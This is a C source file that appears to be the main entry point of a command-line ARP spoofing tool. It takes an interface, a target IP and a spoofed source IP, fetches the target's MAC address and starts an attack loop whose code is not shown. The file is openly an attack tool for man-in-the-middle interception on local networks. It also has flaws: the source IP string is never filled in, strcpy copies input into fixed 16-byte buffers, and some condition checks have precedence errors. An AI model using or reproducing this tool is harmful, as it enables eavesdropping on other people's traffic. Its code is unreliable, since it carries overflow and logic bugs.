
//system header file
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>   
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <errno.h>

//user header file
#include "interf.h"
#include "fetcharpt.h"
#include "fakeip_set.h"
#include "attack.h"





// the color of printf
#define P_NONE "\033[m"
#define P_RED "\033[0;32;31m"
#define P_GREEN "\033[0;32;32m"

int I_flag=0;
int T_flag=0;
int S_flag=0;


void usage(void)
{
  int i;
  char *str;
  
  fprintf(stderr, "Usage: arp_spoof [-i interface] [-t target IP] [-s source IP]\n\n"
      "all option Input the each section please\n\n");
  fprintf(stderr, "\n");
  exit(1);
}

int main(int argc, char* argv[])
{

    char inface_path[256]="/sys/class/net/";
    char inface_name[16]="";

	char targetIP_addr[16]="";
	char sourceIP_addr[16]="";

    unsigned int tTarget_IP;
	unsigned int tSource_IP;

	ATTACK_INFO info= {};

	int opt;
	// opterr =0; //  disable getopt error message
	while((opt=getopt(argc, argv, "i:t:s:")) != -1)
	{
	    switch(opt){
		case 'i': // interface
            I_flag = 1 ;
            strcpy(inface_name,optarg);
            break;
        case 't':
            T_flag = 1 ;
            tTarget_IP = inet_addr(optarg);
			strcpy(targetIP_addr,optarg);
			memcpy(info.target_IP , &tTarget_IP ,sizeof(int)); //arp target(dest) ip address setting
            break;
        case 's':
			S_flag = 1 ;
			tSource_IP = inet_addr(optarg);
			memcpy(info.spoofing_IP , &tSource_IP ,sizeof(int)); //arp source(spoofing) ip address setting
            break;
        default :
            break;
        }
    }

	if (I_flag !=1 || T_flag !=1 || S_flag !=1 ) usage();

	//setting interface info
    if (!interf_init(I_flag,inface_name)){
		fprintf(stderr, P_RED "Error " P_NONE "arp_spoofing : interf_init failed : [" P_GREEN "%s" P_NONE "]\n", inface_name);
	    exit(1);
    }

	//setting target Mac address
	if (!fetch_arpT(T_flag,targetIP_addr,(char *)&info.target_MAC) == FETCH_ARP_TABLE_SUCCESS){
		fprintf(stderr, P_RED "Error " P_NONE "arp_spoofing : fetch_arpT failed : [" P_GREEN "%s" P_NONE "]\n", targetIP_addr);
		exit(1);
	}
	
	//setting source(spoofing) Mac address
	if (!resolution_ipinfo(sourceIP_addr,inface_name, (char*)&info.spoofing_MAC[0]) == 0){
		fprintf(stderr, P_RED "Error " P_NONE "Spoofing data resolution failed\n");
		exit(1);
	} 
	
	attack_loop(info,inface_name);
    exit(0);	
}
